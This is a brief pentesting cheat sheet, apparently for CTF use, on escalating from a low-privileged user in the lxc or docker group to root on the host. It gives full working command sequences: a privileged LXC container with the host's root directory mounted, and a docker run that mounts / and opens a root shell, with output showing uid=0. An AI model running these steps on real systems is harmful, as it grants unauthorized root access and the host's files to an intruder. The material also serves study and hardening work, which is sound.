title: LXC & Docker

# lxc / lxd

If the low privileged user is a member of the `lxc` group then we can abuse `lxc` to access the hosts file system.

* Download: [alpine.tgz](alpine.tgz) 
* GitHub: [saghul / lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder)
```
lxc image import ./alpine.tgz --alias myimage
lxd init
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

# docker

If the low privileged user is a member of the `docker` group then we can use `docker` to access the hosts file system as `root`

Download: [docker-alpine.tar](docker-alpine.tar)

First we import the image

```
╰─⠠⠵ sudo docker import docker-alpine.tar alpine:ctf  
sha256:f40cb3e62c23d080b5bfd2723165641fcee9036e5d0b80013af365b4fd2e9b76
```

Then we check for the `IMAGE ID`

```
╰─⠠⠵ sudo docker images                             
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
alpine              ctf                 f40cb3e62c23        2 seconds ago       5.61MB
```

We then use that `IAMGE ID` in our `docker` command

```
╰─⠠⠵ sudo docker run -v /:/mnt --rm -it f40cb3e62c23 /bin/sh
/ # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/ # 
```